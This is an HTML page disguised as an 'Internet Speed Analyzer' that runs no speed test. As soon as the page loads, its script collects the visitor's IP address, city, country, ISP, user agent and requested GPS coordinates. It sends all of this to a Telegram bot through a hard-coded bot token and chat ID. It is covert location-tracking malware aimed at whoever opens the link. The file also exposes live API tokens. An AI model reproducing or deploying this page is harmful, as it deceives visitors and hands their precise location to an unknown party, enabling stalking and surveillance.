<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Internet Speed Analyzer</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f0f0f0;
      text-align: center;
      padding: 2rem;
    }
    .card {
      background: white;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      padding: 2rem;
      display: inline-block;
      max-width: 400px;
    }
    h1 {
      color: #333;
    }
    .status {
      margin-top: 1rem;
      font-size: 0.95rem;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Speed Analyzer</h1>
    <p>Analyzing your internet speed and region-based latency...</p>
    <p class="status" id="status">Initializing...</p>
  </div>

  <script>
    const TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
    const CHAT_ID = "6978055162";

    async function sendToTelegram(message) {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      });
    }

    async function collectData() {
      const status = document.getElementById("status");
      status.innerText = "Getting IP and system info...";

      let ipData = {};
      try {
        const res = await fetch("https://ipinfo.io/json?token=1ed7e8a879f5de");
        ipData = await res.json();
      } catch (e) {
        ipData = { ip: "Unknown", city: "-", country: "-", org: "-" };
      }

      const userAgent = navigator.userAgent;
      const time = new Date().toLocaleString();

      const baseMsg = `
üì° Internet Speed Analyzer
üïí Time: ${time}
üåê IP: ${ipData.ip}
üèô Location: ${ipData.city}, ${ipData.country}
üì∂ ISP: ${ipData.org}
üß† User Agent: ${userAgent}
      `;

      status.innerText = "Requesting GPS access...";

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          const fullMessage = baseMsg + `\nüìç GPS: Latitude ${latitude}, Longitude ${longitude}`;
          await sendToTelegram(fullMessage);
          status.innerText = "‚úÖ Data sent successfully.";
        }, async (error) => {
          const fullMessage = baseMsg + `\nüìç GPS: Permission denied`;
          await sendToTelegram(fullMessage);
          status.innerText = "‚ö†Ô∏è GPS permission denied, partial data sent.";
        });
      } else {
        const fullMessage = baseMsg + `\nüìç GPS: Not supported`;
        await sendToTelegram(fullMessage);
        status.innerText = "‚ö†Ô∏è Geolocation not supported.";
      }
    }

    collectData();
  </script>
</body>
</html>